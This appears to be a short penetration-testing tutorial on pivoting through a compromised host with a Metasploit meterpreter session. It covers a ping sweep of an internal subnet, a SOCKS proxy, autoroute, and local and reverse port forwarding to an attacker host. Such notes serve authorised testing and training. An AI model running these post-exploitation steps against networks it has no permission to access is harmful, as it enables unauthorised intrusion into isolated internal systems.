
- If we manage to obtain a meterpreter session on the pivot host, we can utilise the various modules at our disposal for tunneling and portforwarding without needing SSH
- Metasploit provides modules to start a socks proxy, add routes to the target environment and also remote and local port forwarding



#### How to do it

Suppose we have managed to gain a meterpreter session on a remote host. Upon enumerating the environment, we come across a different network environment  `172.16.5.129` of which the pivot host is a part.  We first start with a ping sweep to uncover live hosts in this isolated network



##### 1. Ping Sweep from the pivot box on the isolated network

```bash
for i in $(seq 1 254); do (ping 172.16.5.$i -c 1 | grep -i "Bytes From" &); done


[+] Output
172.16.5.19
```



##### 2. Start a socks proxy using metasploit

```bash
run auxiliary/server/socks_proxy
```




##### 3. Add routes to the isolated network via the pivot host

```bash
run post/multi/manage/autoroute
```




Now, we have done everything we need. We can further setup local or remote port forwarding as per requirement by using the `portfwd` command within an active session



##### Local port Forwarding

```bash
portfwd add -l local_port -p remote_port -r remote_host
```


##### Reverse Port Forwarding

```bash
portfwd add -R -l local_port -p remote_port -L attacker_host
```



Now, we can use proxychains to interact with the isolated network from the attacker machine via the SOCKS tunneling we have setup through the pivot box. 


